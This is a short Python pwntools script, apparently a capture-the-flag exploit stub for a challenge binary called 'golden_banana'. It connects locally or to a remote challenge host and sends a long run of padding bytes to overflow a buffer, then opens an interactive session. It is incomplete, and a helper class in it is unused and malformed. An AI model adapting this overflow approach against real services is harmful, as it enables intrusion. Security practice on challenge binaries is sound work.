#!/usr/bin/env python3
from pwn import *
elf = ELF("./given/golden_banana")
MAX_STRING = 1024
MAX_CHOICE = 4
PAD = lambda n: b"a" * n

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 1)
    else:
        p = process([elf.path])
    return p


class location:
    def __init__(self):
        pass
    def get_size():
        return 5160


def exploit():
    p = conn()
    a = p.recv()
    print(a)
    payload = PAD(1024) + PAD(1023)
    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    exploit()
